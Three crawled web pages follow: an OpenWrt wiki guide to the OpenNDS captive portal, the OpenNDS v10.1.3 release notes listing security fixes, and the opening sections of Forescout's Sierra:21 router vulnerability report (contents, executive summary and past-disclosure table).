=== Content from openwrt.org_382f5d28_20250115_093420.html ===


[![OpenWrt Wiki](/_media/logo.png)OpenWrt Wiki](/start "OpenWrt Wiki")

* Tools
  + User Tools
  + [Log In](/docs/guide-user/services/captive-portal/opennds?do=login&sectok= "Log In")
  + Site Tools
  + [Recent Changes](/docs/guide-user/services/captive-portal/opennds?do=recent "Recent Changes [r]")
  + [Media Manager](/docs/guide-user/services/captive-portal/opennds?do=media&ns=docs%3Aguide-user%3Aservices%3Acaptive-portal "Media Manager")
  + [Sitemap](/docs/guide-user/services/captive-portal/opennds?do=index "Sitemap [x]")
  + Page Tools
  + [Show pagesource](/docs/guide-user/services/captive-portal/opennds?do=edit "Show pagesource [v]")
  + [Old revisions](/docs/guide-user/services/captive-portal/opennds?do=revisions "Old revisions [o]")
  + [Backlinks](/docs/guide-user/services/captive-portal/opennds?do=backlink "Backlinks")
  + [Back to top](#dokuwiki__top "Back to top [t]")

* Translations of this page
  + Translations of this page [?](/meta/translation "meta:translation")
  + [English (en)](/docs/guide-user/services/captive-portal/opennds "English")
  + [|العربية (ar)](/ar/docs/guide-user/services/captive-portal/opennds "|العربية")
  + [Česky (cs)](/cs/docs/guide-user/services/captive-portal/opennds "Česky")
  + [Deutsch (de)](/de/docs/guide-user/services/captive-portal/opennds "Deutsch")
  + [Español (es)](/es/docs/guide-user/services/captive-portal/opennds "Español")
  + [Français (fr)](/fr/docs/guide-user/services/captive-portal/opennds "Français")
  + [Magyar (hu)](/hu/docs/guide-user/services/captive-portal/opennds "Magyar")
  + [Italiano (it)](/it/docs/guide-user/services/captive-portal/opennds "Italiano")
  + [日本語 (ja)](/ja/docs/guide-user/services/captive-portal/opennds "日本語")
  + [한국어 (ko)](/ko/docs/guide-user/services/captive-portal/opennds "한국어")
  + [Polski (pl)](/pl/docs/guide-user/services/captive-portal/opennds "Polski")
  + [Português (pt)](/pt/docs/guide-user/services/captive-portal/opennds "Português")
  + [Português (pt-br)](/pt-br/docs/guide-user/services/captive-portal/opennds "Português")
  + [Русский (ru)](/ru/docs/guide-user/services/captive-portal/opennds "Русский")
  + [Türkçe (tr)](/tr/docs/guide-user/services/captive-portal/opennds "Türkçe")
  + [Українська (uk)](/uk/docs/guide-user/services/captive-portal/opennds "Українська")
  + [Tiếng Việt (vi)](/vi/docs/guide-user/services/captive-portal/opennds "Tiếng Việt")
  + [中文 (zh)](/zh/docs/guide-user/services/captive-portal/opennds "中文")
  + [繁體中文 (zh-tw)](/zh-tw/docs/guide-user/services/captive-portal/opennds "繁體中文")

* [Log In](/docs/guide-user/services/captive-portal/opennds?do=login&sectok= "Log In")

---

1. You are here
2. [Home](/start "start")
3. [Documentation](/docs/start "docs:start")
4. [User guide](/docs/guide-user/start "docs:guide-user:start")
5. [Additional services](/docs/guide-user/services/start "docs:guide-user:services:start")
6. [Captive portals (splash pages for free or paid WiFi)](/docs/guide-user/services/captive-portal/start "docs:guide-user:services:captive-portal:start")
7. [OpenNDS Captive Portal](/docs/guide-user/services/captive-portal/opennds "docs:guide-user:services:captive-portal:opennds")

---

 Learn about OpenWrt
#### Learn about OpenWrt

* [Supported devices](/supported_devices "supported_devices")
* [Packages](/packages/start "packages:start")
* [Downloads](/downloads "downloads")
* [Documentation](/docs/start "docs:start")
  + [Quick start guide](/docs/guide-quick-start/start "docs:guide-quick-start:start")
  + [User guide](/docs/guide-user/start "docs:guide-user:start")
  + [Developer guide](/docs/guide-developer/start "docs:guide-developer:start")
* [Security](/docs/guide-developer/security "docs:guide-developer:security")
* [FAQ](/faq "faq")
* [Forum](https://forum.openwrt.org/ "https://forum.openwrt.org/")
#### Contributing

* [Submitting patches](/submitting-patches "submitting-patches")
* [Reporting bugs](/bugs "bugs")
* [Contributing to wiki](/wiki/wikirules "wiki:wikirules")
#### Project

* [About OpenWrt](/about "about")
* [Rules](/rules "rules")
* [Infrastructure](/infrastructure "infrastructure")
* [Donate](/donate "donate")
* [Merchandise](/merchandise "merchandise")
* [Website](/wiki/start "wiki:start")
* [Trademark policy](/trademark "trademark")
* [License](/license "license")
* [Contacts](/contact "contact")

* [Show pagesource](/docs/guide-user/services/captive-portal/opennds?do=edit "Show pagesource [v]")
* [Old revisions](/docs/guide-user/services/captive-portal/opennds?do=revisions "Old revisions [o]")
* [Backlinks](/docs/guide-user/services/captive-portal/opennds?do=backlink "Backlinks")
* [Back to top](#dokuwiki__top "Back to top [t]")

×
####

###### Table of Contents

* [OpenNDS Captive Portal](#opennds_captive_portal)
  + [Overview](#overview)
  + [Documentation](#documentation)
  + [Official Repository](#official_repository)
  + [How OpenNDS (NDS) works](#how_opennds_nds_works)
    - [NDS comes with multiple default Splash Page options](#nds_comes_with_multiple_default_splash_page_options)
    - [FAS, or Forward Authentication Service](#fas_or_forward_authentication_service)
    - [A Note on Captive Portal Detection (CPD)](#a_note_on_captive_portal_detection_cpd)

# OpenNDS Captive Portal

## Overview

openNDS (open Network Demarcation Service) is a high performance, small footprint, Captive Portal.

It provides a border control gateway between a public local area network and the Internet.

It supports all ranges between small stand alone venues through to large mesh networks with multiple portal entry points.

Both the client driven Captive Portal Detection (CPD) method and gateway driven Captive Portal Identification method (CPI - RFC 8910 and RFC 8908) are supported.

In its default configuration, openNDS offers a dynamically generated and adaptive splash page sequence. Internet access is granted by a click to continue button, accepting Terms of Service. A simple option enables input forms for user login.

The package incorporates the FAS API allowing many flexible customisation options.

The creation of sophisticated third party authentication applications is fully supported.

Internet hosted https portals can be implemented with no security errors, to inspire maximum user confidence.

## Documentation

Full documentation can be found at:

[https://opennds.readthedocs.io](https://opennds.readthedocs.io "https://opennds.readthedocs.io")

## Official Repository

The official repository can be found here:

[https://github.com/openNDS/openNDS](https://github.com/openNDS/openNDS "https://github.com/openNDS/openNDS")

## How OpenNDS (NDS) works

OpenNDS is a Captive Portal Engine. Any Captive Portal, including NDS, will have two main components:

* Something that does the capturing, and
* Something to provide a Portal for client users to log in.

A wireless router will typically be running OpenWrt or some other Linux distribution.

A router, by definition, will have two or more interfaces, at least one to connect to the wide area network (WAN) or Internet feed, and at least one connecting to the local area network (LAN).

Each LAN interface must also act as the Default IP Gateway for its LAN, ideally with the interface serving IP addresses to client devices using DHCP.

Multiple LAN interfaces can be combined into a single bridge interface. For example, ethernet, 2.4Ghz and 5Ghz networks are typically combined into a single bridge interface. Logical interface names will be assigned such as eth0, wlan0, wlan1 etc. with the combined bridge interface named as br-lan.

NDS will manage one or more of them of them. This will typically be br-lan, the bridge to both the wireless and wired LAN, but could be, for example, wlan0 if you wanted NDS to work just on the wireless interface.

#### Summary of Operation

By default, NDS blocks everything.

A client will find out it is in a captured state by one of two basic methods:

##### 1. Captive Portal Detection (CPD)

CPD is a client driven process available on all modern mobile devices, most desktop operating systems and most browsers. The CPD process automatically issues a port 80 request on connection to a network as a means of probing for a captive state.

Sometimes known as a “canary test”, this process, driven by the client, has evolved over a number of years to be a reliable de-facto standard. openNDS detects this probing and serves a special “splash” web page sequence to the connecting client device.

##### 2. Captive Portal Identification (CPI)

CPI is a Gateway driven process as defined in standards RFC8910 (Captive-Portal Identification in DHCP and Router Advertisements) and RFC8908 (Captive Portal API).
A gateway router informs a connecting client that it is in a captive state by providing a url at which a client can access for authentication.
A client may access this url to be served the same portal “splash” page sequence as it would have in the traditional CPD method.

Alternatively, a client may use this url to access the RFC8908 Captive Portal API, ultimately being served a splash page sequence for authentication.

From openNDS v9.5.0, The CPI method is supported in both forms and enabled by default. It can be disabled in a config option.

Note: Very few client devices support CPI at the time of writing (November 2021)

Update: Most new devices now support CPI at least to some degree, indicating a probable “S” curve adoption. (January 2023)

#### The Portal

The client browser is redirected to the Portal component. This is a web service that is configured to know how to communicate with the core engine of NDS.
This is commonly known as the “Splash Page”.

NDS has its own web server built in and is used in the basic modes of operation to serve the Portal “Splash” pages to the client browser. Alternatively, a separate web server can be used.

### NDS comes with multiple default Splash Page options

* A trivial Click to Continue splash page sequence (default configuration)
* A Client User form requiring Name and Email address to be entered.
* Admin definable themed page sequences, supporting optional remote content

A single uci config option is used to choose the default splash page sequence for client login.

For the simple “Click to Continue” pages:

```
 option login_option_enabled '1'

```

For the “username/email” pages:

```
 option login_option_enabled '2'
```

For admin defined Themespec pages:

```
 option login_option_enabled '3'

```

The default splash page options can be customised or a complete specialised Portal can be written by the installer (See ThemeSpec, FAS, PreAuth in the documentation).

### FAS, or Forward Authentication Service

FAS, or Forward Authentication Service may use the web server embedded in NDS, a separate web server installed on the NDS router, a web server residing on the local network or an Internet hosted web server.

The user of the client device will always be expected to complete some actions on the splash or captive portal page.
Once the user on the client device has successfully completed the splash page actions, that page then links directly back to NDS.

For security, NDS expects to receive a token, hashed using a pre-shared key.

If this hashed token is valid, NDS then “authenticates” the client device, allowing access to the Internet.

Post authentication processing extensions may be added to NDS (See BinAuth in the documentation). Once NDS has received the valid token it will, if enabled, call a BinAuth script.

BinAuth Post Authentication processing is most often used to provide a mechanism for generating local client access logs.

Binauth can override the FAS and deny access or override quotas and data rate restrictions that may be set by the FAS or globally in the configuration.

If FAS Secure is enabled (Levels 1 (default), 2 and 3), the client authentication token is kept secret at all times. Instead, faskey is used to generate a hashed id value (hid) and this is sent by openNDS to the FAS. The FAS must then in turn generate a new return hash id (rhid) to return to openNDS in its authentication request.

**If set to “0” The FAS is enforced by NDS to use http protocol.** The client token is sent to the FAS in clear text in the query string of the redirect along with authaction and redir. This method is easy to bypass and useful only for the simplest systems where security does not matter.

**If set to “1” The FAS is enforced by NDS to use http protocol.** A base64 encoded query string containing the hid is sent to the FAS, along with the clientip, clientmac, gatewayname, client\_hid, gatewayaddress, authdir, originurl, clientif and custom parameters and variables.

Should the sha256sum utility not be available, openNDS will terminate with an error message on startup.

**If set to “2” The FAS is enforced by NDS to use http protocol.**

clientip, clientmac, gatewayname, client\_hid, gatewayaddress, authdir, originurl and clientif are encrypted using faskey and passed to FAS in the query string.

The query string will also contain a randomly generated initialization vector to be used by the FAS for decryption.

The cipher used is “AES-256-CBC”.

The “php-cli” package and the “php-openssl” module must both be installed for fas\_secure level 2.

openNDS does not depend on this package and module, but will exit gracefully if this package and module are not installed when this level is set.

The FAS must use the query string passed initialisation vector and the pre shared fas\_key to decrypt the query string. An example FAS level 2 php script (fas-aes.php) is stored in the /etc/opennds directory and also supplied in the source code. This should be copied the the web root of a suitable web server for use.

**If set to “3” The FAS is enforced by openNDS to use https protocol.** Level 3 is the same as level 2 except the use of https protocol is enforced for FAS. In addition, the “authmon” daemon is loaded. This allows the external FAS, after client verification, to effectively traverse inbound firewalls and address translation to achieve NDS authentication without generating browser security warnings or errors. An example FAS level 3 php script (fas-aes-https.php) is pre-installed in the /etc/opennds directory and also supplied in the source code. This should be copied the the web root of a suitable web server for use.

Option faskey has a default value. It is recommended that this is set to some secret value in the config file and the FAS script set to use a matching value, ie faskey must be pre-shared with FAS.

### A Note on Captive Portal Detection (CPD)

All modern mobile devices, most desktop operating systems and most browsers now have a CPD process that automatically issues a port 80 request on connection to a network. NDS detects this and serves a special “splash” web page to the connecting client device.

The port 80 html request made by the client CPD can be one of many vendor specific URLs.

Typical CPD URLs used are, for example:

* [http://captive.apple.com/hotspot-detect.html](http://captive.apple.com/hotspot-detect.html "http://captive.apple.com/hotspot-detect.html")
* [http://connectivitycheck.gstatic.com/generate\_204](http://connectivitycheck.gstatic.com/generate_204 "http://connectivitycheck.gstatic.com/generate_204")
* [http://connectivitycheck.platform.hicloud.com/generate\_204](http://connectivitycheck.platform.hicloud.com/generate_204 "http://connectivitycheck.platform.hicloud.com/generate_204")
* [http://www.samsung.com/](http://www.samsung.com/ "http://www.samsung.com/")
* [http://detectportal.firefox.com/success.txt](http://detectportal.firefox.com/success.txt "http://detectportal.firefox.com/success.txt")
* Plus many more

It is important to remember that CPD is designed primarily for mobile devices to automatically detect the presence of a portal and to trigger the login page, without having to resort to breaking SSL/TLS security by requiring the portal to redirect port 443 for example.

Just about all current CPD implementations work very well but some compromises are necessary depending on the application.

The vast majority of devices attaching to a typical Captive Portal are mobile devices. CPD works well giving the initial login page.

For a typical guest wifi, eg a coffee shop, bar, club, hotel etc., a device connects, the Internet is accessed for a while, then the user takes the device out of range.

When taken out of range, a typical mobile device begins periodically polling the wireless spectrum for SSIDs that it knows about to try to obtain a connection again, subject to timeouts to preserve battery life.

Most Captive Portals have a session duration limit (openNDS included).

If a previously logged in device returns to within the coverage of the portal, the previously used SSID is recognised and CPD is triggered and tests for an Internet connection in the normal way. Within the session duration limit of the portal, the Internet connection will be established, if the session has expired, the splash page will be displayed again.

Early mobile device implementations of CPD used to poll their detection URL at regular intervals, typically around 30 to 300 seconds. This would trigger the Portal splash page quite quickly if the device stayed in range and the session limit had been reached.

However it was very quickly realised that this polling kept the WiFi on the device enabled continuously having a very negative effect on battery life, so this polling whilst connected was either increased to a very long interval or removed all together (depending on vendor) to preserve battery charge. As most mobile devices come and go into and out of range, this is not an issue.

**A common issue raised is:**

*“My devices show the splash page when they first connect, but when the authorization expires, they just announce there is no internet connection. I have to make them “forget” the wireless network to see the splash page again. Is this how is it supposed to work?”*

This is normal, but you will find just manually disconnecting or turning WiFi off and on will simulate a “going out of range”, initialising an immediate trigger of the CPD. One or any combination of these solutions should work, again depending on the particular vendor's implementation of CPD.

In contrast, most laptop/desktop operating systems, and browser versions for these still implement CPD polling whilst online as battery considerations are not so important.

For example, Gnome desktop has its own built in CPD browser with a default interval of 300 seconds. Firefox also defaults to something like 300 seconds. Windows 10 is similar.

This IS how it is supposed to work, but does involve some compromises.

The best solution is to set the session timeout to a value greater than the expected length of time a client device is likely to be present. Experience shows a limit of 24 hours covers most situations eg bars, clubs, coffee shops, motels etc. If for example an hotel has guests regularly staying for a few days, then increase the session timeout as required.

Staff at the venue could have their devices added to the Trusted List if appropriate, but experience shows, it is better not to do this as they very soon learn what to do and can help guests who encounter the issue. (Anything that reduces support calls is good!)

Most such issues with CPD are potentially solved by the use of CPI instead but would require its adoption by all client device vendors.
CPI is a new standard that is evolving as it is universally adopted. At the time of writing, most new devices support it to some degree.

This website uses cookies. By using the website, you agree with storing cookies on your computer. Also you acknowledge that you have read and understand our Privacy Policy. If you do not agree leave the website.OK[More information about cookies](https://en.wikipedia.org/wiki/HTTP_cookie)

* Last modified: 2023/01/13 20:48
* by bluewavenet

**Self-registration in the wiki has been disabled.

If you want to contribute to the OpenWrt wiki, please post [HERE](https://forum.openwrt.org/t/applying-for-openwrt-wiki-account/101671 "https://forum.openwrt.org/t/applying-for-openwrt-wiki-account/101671") in the forum or ask on IRC for access.**

---

[![cc](/lib/tpl/bootstrap3/images/license/cc.png) ![by](/lib/tpl/bootstrap3/images/license/by.png) ![sa](/lib/tpl/bootstrap3/images/license/sa.png)](https://creativecommons.org/licenses/by-sa/4.0/deed.en "CC Attribution-Share Alike 4.0 International")

Except where otherwise noted, content on this wiki is licensed under the following license:
[CC Attribution-Share Alike 4.0 International](https://creativecommons.org/licenses/by-sa/4.0/deed.en "CC Attribution-Share Alike 4.0 International")

![](/lib/exe/taskrunner.php?id=docs%3Aguide-user%3Aservices%3Acaptive-portal%3Aopennds&1736933660)



=== Content from github.com_f2c874d1_20250115_093420.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FopenNDS%2FopenNDS%2Freleases%2Ftag%2Fv10.1.3)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FopenNDS%2FopenNDS%2Freleases%2Ftag%2Fv10.1.3)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=openNDS%2FopenNDS)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[openNDS](/openNDS)
/
**[openNDS](/openNDS/openNDS)**
Public

* [Notifications](/login?return_to=%2FopenNDS%2FopenNDS) You must be signed in to change notification settings
* [Fork
  88](/login?return_to=%2FopenNDS%2FopenNDS)
* [Star
   338](/login?return_to=%2FopenNDS%2FopenNDS)

* [Code](/openNDS/openNDS/tree/v10.1.3)
* [Issues
  4](/openNDS/openNDS/issues)
* [Pull requests
  1](/openNDS/openNDS/pulls)
* [Actions](/openNDS/openNDS/actions)
* [Projects
  0](/openNDS/openNDS/projects)
* [Security](/openNDS/openNDS/security)
* [Insights](/openNDS/openNDS/pulse)

Additional navigation options

* [Code](/openNDS/openNDS/tree/v10.1.3)
* [Issues](/openNDS/openNDS/issues)
* [Pull requests](/openNDS/openNDS/pulls)
* [Actions](/openNDS/openNDS/actions)
* [Projects](/openNDS/openNDS/projects)
* [Security](/openNDS/openNDS/security)
* [Insights](/openNDS/openNDS/pulse)

1. [Releases](/openNDS/openNDS/releases)
2. [v10.1.3](/openNDS/openNDS/releases/tag/v10.1.3)

# OpenNDS v10.1.3 release

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/openNDS/openNDS/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v10.1.3)

 Loading

[View all tags](/openNDS/openNDS/tags)

![@bluewavenet](https://avatars.githubusercontent.com/u/13632068?s=40&v=4)
[bluewavenet](/bluewavenet)
released this
28 Aug 12:00

·
[130 commits](/openNDS/openNDS/compare/v10.1.3...master)
to master
since this release

[v10.1.3](/openNDS/openNDS/tree/v10.1.3)

[`69dde77`](/openNDS/openNDS/commit/69dde77927b252e2a4347170504a785ac5d50c33)

This commit was created on GitHub.com and signed with GitHub’s **verified signature**.
The key has expired.

GPG key ID: 4AEE18F83AFDEB23
Expired

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

opennds (10.1.3)

Security Advisory. This version contains fixes for multiple potential security vulnerabilities

Credit - Stanislav Dashevskyi - standash.github.io [standash]

It also contains some minor bug fixes

* Fix - Buffer overflow causing segfault - [CVE-2023-41101](https://github.com/advisories/GHSA-75j8-mr4c-4x59 "CVE-2023-41101") [bluewavenet]
* Fix - Memory leaks due to passing allocated buffer into safe\_asprintf() - [CVE-2023-41102](https://github.com/advisories/GHSA-98jh-839r-xp86 "CVE-2023-41102") [bluewavenet]
* Fix - Remove deprecated preauth option [bluewavenet]
* Fix - missing free in show\_preauth\_page if MHD does not respond [bluewavenet]
* Fix - more safe\_asprintf memory leaks [bluewavenet]
* Fix - missing free for mark\_auth [bluewavenet]
* Fix - memory leak after starting authmon daemon [bluewavenet]
* Fix - memory leak in encode\_and\_redirect\_to\_splashpage [bluewavenet]
* Fix - Community themespec, voucher css and logo image [bluewavenet]
* Fix - ThemeSpec, path to logo in page footer [bluewavenet]
* Fix - ensure gatewayurl is urldecoded to fix broken css and images in themespec [bluewavenet]
* Add - set default fas remote fqdn to disabled [bluewavenet]

-- Rob White dot@blue-wave.net Sat, 28 Aug 2023 09:46:35 +0000

 Assets
4

 Loading

All reactions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.forescout.com_7f55b9d8_20250115_093429.html ===

Contents
1.  Executive Summary ........................................................................................................................................... 4

2.  Why Analyze Sierra Wireless Routers? ............................................................................................................. 4

3.  Main Findings .................................................................................................................................................... 6

3.1.

3.2.

Analyzed Components .............................................................................................................................. 6

New Vulnerabilities .................................................................................................................................... 6

4.

Impact ................................................................................................................................................................ 9

5.  Attack Scenarios .............................................................................................................................................. 11

6.  Mitigation Recommendations .......................................................................................................................... 13

7.  Conclusion ....................................................................................................................................................... 14

Part 2: Technical Dive-Ins ....................................................................................................................................... 16

8.  Technical Dive-In #1: Research methodology ................................................................................................. 17

8.1.

8.2.

Component analysis and prioritization .................................................................................................... 17

Static and dynamic analysis of binaries .................................................................................................. 19

9.  Technical Dive-In #2: Details of new vulnerabilities ......................................................................................... 20

9.1.

9.2.

CVE-2023-40464: Default SSL private key and certificate ..................................................................... 20

CVE-2023-40463: Root shell access and hardcoded password hashes ................................................ 20

9.3.  Web vulnerabilities .................................................................................................................................. 22

9.4.

CVE-2023-40458 and CVE-2023-40462: TinyXML denials of service .................................................... 25

9.5.  OpenNDS NULL-pointer dereference issues .......................................................................................... 27

9.6.  OpenNDS OS command execution ........................................................................................................ 29

9.7.  OpenNDS memory leaks and remote code execution ............................................................................ 31

10.

Technical Dive-In #3: Exploiting CVE-2023-41101 on LX60 ....................................................................... 33

10.1.  A closer look at the binary ....................................................................................................................... 34

10.2.  Limitations and caveats ........................................................................................................................... 35

10.3.  Finding information leaks ........................................................................................................................ 35

10.4.  Putting it all together ............................................................................................................................... 37

Sierra:21 – Living on the Edge

2

Forescout Vedere Labs has discovered 21 new vulnerabilities
within OT/IoT routers and open-source software components,
highlighting new risk in your critical infrastructure.

This new research confirms some of the trends that
Forescout Vedere Labs has been tracking and analyzing:

•  Vulnerabilities (and consequently attacks) on routers and

network infrastructure are on the rise. State-sponsored actors
have been developing custom malware to use routers for
persistence and espionage, while cybercriminals are leveraging
them for residential proxies and to recruit into botnets.

•  Vulnerabilities in OT/IoT devices often arise from design flaws
(such as the use of hardcoded credentials and certificates we
saw in OT:ICEFALL) or issues when parsing malformed input
(as we saw with Project Memoria).

•  Supply chain components, including open-source software

provided by third parties, can introduce high risk and increase
the attack surface of critical devices, leading to vulnerabilities
that may be hard for asset owners to track and mitigate.

Why it matters: Most organizations have control over the attack
surface of their IT network. However, there are many OT/IoT
devices that represent an increased attack surface for organizations
in different sectors and do not receive the same level of attention.
Through this research, Forescout Vedere Labs intends to shed light
on the increased risk exposure and the possible mitigation
techniques.

Sierra:21 – Living on the Edge

3

1. Executive Summary

•  Forescout Vedere Labs has identified a total of 21 new vulnerabilities affecting one of the most popular
OT/IoT routers used to connect critical local networks to the Internet via cellular connections such
as 3G and 4G.

•  The vulnerabilities affect Sierra Wireless AirLink cellular routers and some of their open source
components, such as TinyXML and OpenNDS, which are used in a variety of other products.

•  Of the 21 vulnerabilities, 1 has critical severity, 9 have high severity and 11 have medium severity. These

vulnerabilities may allow attackers to steal credentials, take control of a router by injecting
malicious code, persist on the device and use it as an initial access point into critical networks.

•  Affected devices can be found in multiple critical infrastructure sectors, such as manufacturing and
healthcare, government and commercial facilities, energy and power distribution, transportation,
water and wastewater systems, retail, emergency services and vehicle tracking. Affected devices
can also be used to stream video for remote video surveillance or to connect police vehicles to
internal networks.

•  More than 86,000 vulnerable routers are exposed online. Less than 10% of the total exposed

routers are confirmed to be patched against known previous vulnerabilities found since 2019, which
indicates a large attack surface. Ninety percent of devices exposing a specific management interface
(AT commands over Telnet) have reached end of life, meaning they cannot be further patched.

•  Sierra Wireless, OpenNDS and Nodogsplash have been very responsive, and the relevant

vulnerabilities have been patched. TinyXML is an abandoned project, so the upstream vulnerabilities
will not be fixed and must be addressed downstream. Beyond patching, recommended mitigations
include disabling WiFi captive portals, deploying web application firewalls and using OT/IoT-
aware intrusion detection systems.

Finding so many new vulnerabilities on software components of a well-studied device shows that device
manufacturers, and in turn asset owners, must pay special attention to risks stemming from the software supply
chain, both from open- and closed-source components. Asset owners are the ones who, in the end, may get
breached due to insecure devices on their networks and, currently, they must either depend on device
manufacturers to adequately address supply chain vulnerabilities or implement their own risk mitigation strategies
that do not rely exclusively on patching.

The former option is risky, since as we observed two years ago when concluding Project Memoria, legacy
software components enable the connected world.  Vulnerability notification to a large number of parties is
difficult. Vendors or maintainers are often unresponsive, which means that organizations across several industries
may remain vulnerable for a long time. The latter option - risk mitigation - is more broadly applicable and can lead
to an overall better security posture against new and old vulnerabilities in critical devices.

2. Why Analyze Sierra Wireless Routers?
OT/IoT cellular routers connect critical devices to the Internet for monitoring and control, such as devices in
electrical substations, oil and gas fields, remote healthcare locations, smart cities and more. Two example
applications are shown in Figure 1, at the top there is a system where an Axis IP camera is connected to a Sierra
Wireless AirLink LX40 cellular router to stream video for remote video surveillance; at the bottom there is a
system where a Sierra Wireless AirLink MP70 is used to connect a police vehicle with several internal devices to
a central network management system. Other use cases mentioned on the vendor’s website include industrial
asset monitoring in manufacturing, connectivity for temporary healthcare facilities, and management of electric
vehicle charging stations.

Sierra:21 – Living on the Edge

4

Figure 1 – Two example applications of OT/IoT cellular routers. At the top, an Axis IP camera connected to a Sierra
Wireless LX40 router for remote video surveillance (from the vendor’s website). At the bottom, several devices in a
police vehicle connected to a network management system via a Sierra Wireless MP70 (from the vendor’s website).

Sierra Wireless is arguably the most popular brand of OT/IoT cellular routers. Other popular vendors include
Teltonika, InHand, and MOXA. WiGLE.net, an open database of WiFi networks, shows 245,000 networks
worldwide running Sierra Wireless, while Teltonika has 184,000 and InHand 13,000. Sierra Wireless devices are
also the most popular on Shodan (more details in Section 4). These numbers are just a fraction of the total
number of such devices in use worldwide. For instance, some Sierra Wireless devices have MAC OUIs from other
vendors – such as Universal Global Scientific Industrial – and many in the wild are not running WiFi networks.

Most Sierra Wireless AirLink routers ship with the AirLink Enterprise Operating System (ALEOS), a set of
proprietary services, components, and applications built on top of an embedded Linux distribution. There are
currently three major versions of ALEOS, 4.4.x, 4.9.x, and 4.x.0, each supporting different device families.
Several devices that use the 4.4.x branch were declared End-of-Life (EOL) circa 2021. Therefore, the latest
available version (4.4.9) stopped receiving security patches around that time as well.

Vulnerabilities in these devices may allow direct access to critical assets, making them the subject of intense
security research in recent years. Thirty-six vulnerabilities have affected Sierra Wireless AirLink devices since
2019, as shown in Table 1.

Table 1 – Past vulnerability disclosures for Sierra Wireless devices

Disclosure / Year

Affected versions

Affected components

Vulnerabilities

Cisco Talos, 2019

ALEOS prior to 4.4.9, 4.9.4 or 4.12.0

ACEmanager, snmpd

Customer reports, 2019

ALEOS prior to 4.4.9, 4.9.5 or 4.12.0

SSH service

13

1

Sierra:21 – Living on the Edge

5

Internal testing, 2020

ALEOS prior to 4.4.9, 4.9.5 or 4.13.0

ACEmanager, LAN-side RPC
server, ALEOS AT command
interface, ALEOS SMS handler,
ALEOS ACEView service

IOactive, 2020

ALEOS prior to 4.4.9, 4.9.5 or 4.14.0

UpdateRebootMgr service,

Internal testing, 2021

ALEOS 4.4.9 and earlier, ALEOS prior
to 4.9.6 or 4.15.0

LAN-side RPC server

ACEmanager, ALEOS AT
command interface, ALEOS SMS
handler

OTORIO, 2022

ALEOS 4.4.9 and earlier (EOL), ALEOS
prior to 4.9.8 or 4.16.0

ACEmanager

11

2

7

2

Despite these prior findings, our results show that a deeper analysis – focused on the different software
components of these devices – can yield new, critical findings.

3. Main Findings

3.1.  Analyzed components

ALEOS is a large framework, compelling us to prioritize for analysis components that could yield more
vulnerabilities. We analyzed the following components, with details behind their selection provided in Section 8.1:
